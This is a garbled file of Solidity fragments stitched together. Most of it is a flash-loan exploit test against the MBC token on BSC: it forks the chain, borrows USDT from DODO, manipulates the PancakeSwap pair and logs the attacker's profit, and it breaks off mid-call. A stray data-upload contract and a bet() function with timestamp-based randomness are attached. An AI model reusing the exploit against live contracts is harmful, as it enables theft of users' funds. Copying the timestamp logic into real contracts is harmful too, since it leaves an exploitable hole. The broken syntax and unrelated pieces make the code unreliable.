
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
interface IMBC is IERC20 {
   function swapAndLiquifyStepv1() external};
contract ContractTest is DSTest {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IMBC MBC = IMBC(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17);
    address dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint dodoFlahloanAmount;
    function setUp() public {
        cheats.createSelectFork("bsc", 23474460)};
    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        MBC.approve(address(Router), type(uint256).max);
        dodoFlahloanAmount = USDT.balanceOf(dodo);
        DVM(dodo).flashLoan(0,
            dodoFlahloanAmount,
            address(this),;
            new bytes(1));
        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit",
            USDT.balanceOf(address(this)),;
            18)};
    function DPPFlashLoanCall(address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data) external {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(MBC);
        uint[] memory values = Router.getAmountsOut(150_000 * 10**18, path);
        USDT.transfer(address(Pair), 150_000 * 10**18);
        Pair.swap(values[1],
            0,
            address(this),;
            "");
        MBC.swapAndLiquifyStep
function bet() public {
    require(block.timestamp % 2 == 0, "Unfair time-based logic")}